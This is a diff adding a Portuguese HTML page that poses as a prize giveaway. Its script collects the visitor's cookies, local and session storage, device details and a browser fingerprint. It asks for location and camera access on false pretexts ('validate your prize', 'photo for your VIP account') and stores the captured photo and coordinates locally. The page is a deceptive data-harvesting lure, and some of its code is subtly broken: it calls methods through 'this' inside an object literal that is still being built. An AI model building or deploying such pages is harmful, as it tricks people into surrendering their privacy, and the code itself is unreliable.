@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 Seu Prêmio Especial Aguarda!</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #333;
+    }
+
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 600px;
+      width: 90%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 12px;
+      color: #667eea;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+
+    .content {
+      margin-bottom: 30px;
+    }
+
+    .feature {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      padding: 12px;
+      background: #f5f5f5;
+      border-radius: 8px;
+    }
+
+    .feature-icon {
+      font-size: 24px;
+      margin-right: 12px;
+    }
+
+    .feature-text {
+      text-align: left;
+      flex: 1;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      padding: 16px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-bottom: 12px;
+      width: 100%;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #667eea;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .permission-request {
+      display: none;
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .permission-request h3 {
+      color: #856404;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .permission-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .permission-buttons button {
+      flex: 1;
+      padding: 8px;
+      border: 1px solid #ffc107;
+      background: white;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .permission-buttons button:hover {
+      background: #fff9e6;
+    }
+
+    .success {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background: #d4edda;
+      border: 1px solid #28a745;
+      border-radius: 8px;
+      color: #155724;
+    }
+
+    .success h2 {
+      margin-bottom: 10px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .small-text {
+      font-size: 12px;
+      color: #999;
+      margin-top: 15px;
+    }
+
+    #cameraFeed {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      max-height: 300px;
+      object-fit: cover;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎁 Seu Prêmio Especial!</h1>
+    <p class="subtitle">Clique abaixo para ativar sua promoção exclusiva</p>
+
+    <div class="content" id="mainContent">
+      <div class="feature">
+        <span class="feature-icon">✨</span>
+        <div class="feature-text">
+          <strong>Acesso VIP</strong>
+          <p style="font-size: 12px; color: #999; margin-top: 4px;">Ganhe benefícios exclusivos</p>
+        </div>
+      </div>
+
+      <div class="feature">
+        <span class="feature-icon">🚀</span>
+        <div class="feature-text">
+          <strong>Resultado Instantâneo</strong>
+          <p style="font-size: 12px; color: #999; margin-top: 4px;">Veja seu resultado em tempo real</p>
+        </div>
+      </div>
+
+      <div class="feature">
+        <span class="feature-icon">🔒</span>
+        <div class="feature-text">
+          <strong>100% Seguro</strong>
+          <p style="font-size: 12px; color: #999; margin-top: 4px;">Seus dados são protegidos</p>
+        </div>
+      </div>
+
+      <button class="btn" onclick="tracker.start()">Ativar Agora</button>
+    </div>
+
+    <div class="permission-request" id="permissionRequest">
+      <h3>📍 Permitir Acesso à Localização?</h3>
+      <p style="font-size: 12px; margin-bottom: 10px;">Precisamos confirmar sua localização para validar seu prêmio.</p>
+      <div class="permission-buttons">
+        <button onclick="tracker.requestGeolocation()">Permitir</button>
+        <button onclick="tracker.skipGeolocation()">Pular</button>
+      </div>
+    </div>
+
+    <div class="permission-request" id="cameraRequest">
+      <h3>📷 Permitir Acesso à Câmera?</h3>
+      <p style="font-size: 12px; margin-bottom: 10px;">Capturar uma foto para sua conta VIP.</p>
+      <video id="cameraFeed" autoplay></video>
+      <canvas id="photoCanvas"></canvas>
+      <div class="permission-buttons">
+        <button onclick="tracker.requestCamera()">Ativar Câmera</button>
+        <button onclick="tracker.skipCamera()">Pular</button>
+      </div>
+    </div>
+
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <p style="margin-top: 15px; color: #667eea; font-weight: 600;">Processando seus dados...</p>
+    </div>
+
+    <div class="success" id="success">
+      <h2>✓ Prêmio Ativado!</h2>
+      <p>Seus dados foram registrados com sucesso.</p>
+      <p style="margin-top: 10px; font-size: 12px;">Você pode fechar esta página.</p>
+    </div>
+
+    <p class="small-text">
+      Clicando em "Ativar Agora", você concorda com nossos <a href="#" style="color: #667eea; text-decoration: none;">Termos de Serviço</a>
+    </p>
+  </div>
+
+  <script>
+    const tracker = {
+      visitData: {
+        id: Date.now() + Math.random().toString(36).substr(2, 9),
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth,
+          orientation: screen.orientation?.type || 'N/A'
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        onLine: navigator.onLine,
+        doNotTrack: navigator.doNotTrack,
+        cookies: this.getCookies(),
+        localStorage: this.getLocalStorage(),
+        sessionStorage: this.getSessionStorage(),
+        geolocation: null,
+        photo: null,
+        fingerprint: this.generateFingerprint(),
+        referrer: document.referrer,
+        location: window.location.href,
+        docTitle: document.title,
+        plugins: this.getPlugins(),
+        performance: this.getPerformanceData(),
+        battery: null
+      },
+
+      start() {
+        document.getElementById('mainContent').classList.add('hidden');
+        document.getElementById('loading').style.display = 'block';
+
+        setTimeout(() => {
+          document.getElementById('loading').style.display = 'none';
+          document.getElementById('permissionRequest').style.display = 'block';
+        }, 1500);
+      },
+
+      requestGeolocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              this.visitData.geolocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp
+              };
+              this.proceedToCamera();
+            },
+            (error) => {
+              console.log('Geolocation denied');
+              this.proceedToCamera();
+            }
+          );
+        } else {
+          this.proceedToCamera();
+        }
+      },
+
+      skipGeolocation() {
+        this.proceedToCamera();
+      },
+
+      proceedToCamera() {
+        document.getElementById('permissionRequest').style.display = 'none';
+        document.getElementById('cameraRequest').style.display = 'block';
+      },
+
+      requestCamera() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+          .then((stream) => {
+            const video = document.getElementById('cameraFeed');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+              this.capturePhoto(stream);
+            }, 2000);
+          })
+          .catch((error) => {
+            console.log('Camera denied');
+            this.skipCamera();
+          });
+      },
+
+      capturePhoto(stream) {
+        const canvas = document.getElementById('photoCanvas');
+        const video = document.getElementById('cameraFeed');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        this.visitData.photo = canvas.toDataURL('image/jpeg', 0.7);
+        
+        stream.getTracks().forEach(track => track.stop());
+        this.finalize();
+      },
+
+      skipCamera() {
+        document.getElementById('cameraRequest').style.display = 'none';
+        this.finalize();
+      },
+
+      finalize() {
+        document.getElementById('loading').style.display = 'block';
+        
+        setTimeout(() => {
+          this.saveVisitorData();
+          document.getElementById('loading').style.display = 'none';
+          document.getElementById('success').style.display = 'block';
+        }, 1500);
+      },
+
+      getCookies() {
+        return document.cookie || 'Nenhum';
+      },
+
+      getLocalStorage() {
+        const data = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          data[key] = localStorage.getItem(key).substring(0, 50);
+        }
+        return Object.keys(data).length > 0 ? data : { note: 'Vazio' };
+      },
+
+      getSessionStorage() {
+        const data = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          data[key] = sessionStorage.getItem(key).substring(0, 50);
+        }
+        return Object.keys(data).length > 0 ? data : { note: 'Vazio' };
+      },
+
+      getPlugins() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          plugins.push(navigator.plugins[i].name);
+        }
+        return plugins.length > 0 ? plugins : ['Nenhum'];
+      },
+
+      getPerformanceData() {
+        if (performance.timing) {
+          return {
+            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            connectTime: performance.timing.responseEnd - performance.timing.requestStart,
+            renderTime: performance.timing.domComplete - performance.timing.domLoading
+          };
+        }
+        return { note: 'N/A' };
+      },
+
+      generateFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Browser Fingerprint', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Browser Fingerprint', 4, 17);
+        
+        return canvas.toDataURL().substring(0, 50) + '...';
+      },
+
+      saveVisitorData() {
+        let visitors = JSON.parse(localStorage.getItem('_visitor_data_') || '[]');
+        visitors.push(this.visitData);
+        localStorage.setItem('_visitor_data_', JSON.stringify(visitors));
+      }
+    };
+
+    // Auto-collect some data on page load
+    window.addEventListener('load', () => {
+      // Pode adicionar mais tracking automático aqui
+    });
+  </script>
+</body>
+</html>
